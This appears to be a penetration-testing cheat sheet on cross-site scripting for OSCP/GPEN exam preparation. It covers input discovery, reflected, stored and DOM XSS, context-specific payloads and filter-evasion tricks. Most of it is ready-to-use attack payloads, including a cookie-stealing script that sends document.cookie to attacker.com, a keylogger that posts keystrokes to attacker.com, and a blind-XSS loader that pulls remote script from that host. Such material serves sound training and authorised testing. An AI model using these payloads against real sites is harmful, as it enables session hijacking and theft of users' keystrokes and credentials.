# Cross-Site Scripting (XSS) Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **structured methodology for identifying, testing, exploiting, and escalating Cross-Site Scripting (XSS) vulnerabilities** during **OSCP and GPEN exams**.

Core methodology:

```
Discover Input → Test Reflection → Identify Context → Craft Payload → Bypass Filters → Exploit
```

XSS vulnerabilities occur when **user input is inserted into a web page without proper sanitization or encoding**.

---

# 1. Identify Input Points

Look for user-controlled inputs:

```
Search fields
Login forms
Comment fields
Contact forms
URL parameters
Headers
Cookies
File names
```

Example:

```
http://target.com/search?q=test
```

Test payload:

```
<script>alert(1)</script>
```

---

# 2. Types of XSS

| Type | Description |
|-----|-------------|
| Reflected XSS | Payload reflected in response |
| Stored XSS | Payload stored on server |
| DOM XSS | Vulnerability in client-side JavaScript |

---

# 3. Basic XSS Payloads

Test simple payloads:

```
<script>alert(1)</script>
```

Alternative:

```
<img src=x onerror=alert(1)>
```

Other basic payloads:

```
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
```

---

# 4. Test Reflection

Inject payload:

```
test<script>alert(1)</script>
```

If the page returns:

```
test<script>alert(1)</script>
```

Then reflection exists.

---

# 5. Identify Context

Determine where input appears:

```
HTML body
HTML attribute
JavaScript code
URL
CSS
```

Example contexts:

```
<input value="USER_INPUT">
```

```
<script>var user="USER_INPUT"</script>
```

Payload must match context.

---

# 6. HTML Context Payloads

Basic payload:

```
<script>alert(1)</script>
```

Alternative:

```
<img src=x onerror=alert(1)>
```

---

# 7. Attribute Context Payloads

Example vulnerable code:

```
<input value="USER_INPUT">
```

Payload:

```
" onmouseover="alert(1)
```

---

# 8. JavaScript Context Payloads

Example:

```
<script>var data="USER_INPUT"</script>
```

Payload:

```
";alert(1);//
```

---

# 9. Event-Based Payloads

Use HTML events.

Examples:

```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

---

# 10. Bypass Basic Filters

If `<script>` blocked, try alternatives.

Examples:

```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
```

---

# 11. Encoding Bypass

Use encoded payloads.

URL encoding:

```
%3Cscript%3Ealert(1)%3C/script%3E
```

HTML encoding:

```
&#x3C;script&#x3E;
```

---

# 12. Filter Evasion Techniques

Break keywords:

```
<scr<script>ipt>alert(1)</script>
```

Use comments:

```
<scr<!-- -->ipt>alert(1)</script>
```

---

# 13. DOM XSS Detection

Look for JavaScript sinks:

```
document.write
innerHTML
eval
setTimeout
setInterval
```

Example vulnerable code:

```
document.write(location.hash)
```

Test payload:

```
#<script>alert(1)</script>
```

---

# 14. Test Common DOM Sources

```
location
document.URL
document.cookie
document.referrer
window.name
```

---

# 15. Cookie Theft

Steal session cookie:

```
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

---

# 16. Session Hijacking

Capture cookie and reuse session.

Example:

```
PHPSESSID=123456
```

Reuse in browser.

---

# 17. Keylogging Payload

Example:

```
<script>
document.onkeypress=function(e){
fetch('http://attacker.com/?key='+e.key)
}
</script>
```

---

# 18. Stored XSS Exploitation

Inject payload into stored input:

```
comment fields
user profiles
forum posts
```

Every visitor executes payload.

---

# 19. XSS in HTTP Headers

Test headers:

```
User-Agent
Referer
X-Forwarded-For
```

Example:

```
User-Agent: <script>alert(1)</script>
```

---

# 20. XSS in Cookies

Test cookie injection:

```
Cookie: session=<script>alert(1)</script>
```

---

# 21. XSS in File Uploads

Upload file with payload in filename.

Example:

```
"><script>alert(1)</script>.jpg
```

---

# 22. XSS via SVG

SVG supports scripts.

Example:

```
<svg><script>alert(1)</script></svg>
```

---

# 23. XSS in Markdown

Some apps render markdown.

Payload:

```
![x](javascript:alert(1))
```

---

# 24. Blind XSS

Occurs when payload executed in admin panel.

Use external callback:

```
<script src=http://attacker.com/xss.js></script>
```

---

# 25. XSS Automation Tools

Useful tools:

```
Burp Suite
XSStrike
Dalfox
XSSer
```

Example:

```bash
dalfox url http://target.com/page?q=test
```

---

# 26. Burp Suite Testing

Intercept requests.

Test payloads in:

```
GET parameters
POST parameters
cookies
headers
```

Use **Burp Repeater**.

---

# 27. Content Security Policy (CSP)

Check header:

```
Content-Security-Policy
```

If strict CSP present, script execution may be restricted.

---

# 28. XSS Payload Cheat List

Common payloads:

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

---

# 29. XSS Testing Workflow

```
1. Identify input fields
2. Test reflection
3. Identify context
4. Try basic payload
5. Attempt filter bypass
6. Exploit vulnerability
```

---

# 30. Common XSS Vulnerabilities in Exams

Typical exam scenarios:

```
Search input reflection
Comment field stored XSS
DOM-based XSS
Weak filtering
```

---

# 31. Quick XSS Testing Commands

Basic test:

```
<script>alert(1)</script>
```

Alternative:

```
<img src=x onerror=alert(1)>
```

Encoded:

```
%3Cscript%3Ealert(1)%3C/script%3E
```

---

# 32. Final Advice

XSS is about **understanding how input is rendered**.

Always ask:

```
Where does my input appear?
What context is it in?
Can I break out of it?
```

Once you understand the context, **payload creation becomes straightforward**.
